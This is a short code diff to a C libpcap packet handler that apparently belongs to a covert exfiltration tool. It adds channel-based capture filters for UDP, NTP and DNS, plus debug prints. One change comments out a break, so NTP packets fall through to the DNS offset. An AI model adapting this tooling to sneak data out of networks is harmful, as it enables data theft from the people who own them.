@@ -31,14 +31,18 @@ struct exfil_pack
 
 int channel;
 
-void pcap_start(const char *fltr_str, uint32 ipaddr, char *folder, int chan)
+void pcap_start(uint32 ipaddr, char *folder, int chan)
 {
 	pcap_t* nic;
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pthread_t exfil_thread;
 	struct exfil_pack expack;
+	char * fltr_str = DEF_FLT;
 
 	channel = chan;
+
+	if (channel == 2)
+		fltr_str = DNS_FLT;
 
 	// Setup Exfil Watch
 	expack.ipaddr = ipaddr;
@@ -80,14 +84,19 @@ void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info, const u_char 
 	{
 		case CHAN_UDP:
 			sig_pos += UDP_SIG;
+			//printf("UDP works\n");
 			break;
 		case CHAN_NTP:
 			sig_pos += NTP_SIG;
-			break;
+			printf("NTP works\n");
+			//break;
 		case CHAN_DNS:
 			sig_pos += DNS_SIG;
+			//printf("DNS works\n");
 			break;
 	}
+
+	//printf("Channel: %d\n", channel);
 
 	// Step 1: locate the payload portion of the packet
 	if (pkt_info->caplen - sig_pos <= 0)
